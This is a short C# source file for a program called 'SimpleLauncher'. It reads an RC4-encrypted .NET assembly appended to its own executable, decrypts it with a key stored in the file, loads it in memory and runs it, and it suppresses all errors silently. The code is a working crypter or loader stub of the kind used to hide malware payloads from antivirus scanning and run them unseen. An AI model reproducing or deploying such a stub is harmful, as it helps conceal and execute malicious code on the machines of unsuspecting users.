using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Reflection;

namespace SimpleLauncher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
                int selfSize = 8192;
                string selfFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "");
                FileStream self = new FileStream(selfFileName, FileMode.Open, FileAccess.Read);
                BinaryReader selfReader = new BinaryReader(self);
                selfReader.ReadBytes(selfSize);
                string str_key = selfReader.ReadString();
                byte[] key = System.Text.Encoding.ASCII.GetBytes(str_key);
                int length = selfReader.ReadInt32();
                byte[] cryptogram = selfReader.ReadBytes(length);
                byte[] program = RC4.Decrypt(key, cryptogram);
                Assembly.Load(program).EntryPoint.Invoke(null, null);
            }
            catch (Exception err)
            {
                //System.Windows.Forms.MessageBox.Show(err.Message);
            }
        }
    }
}
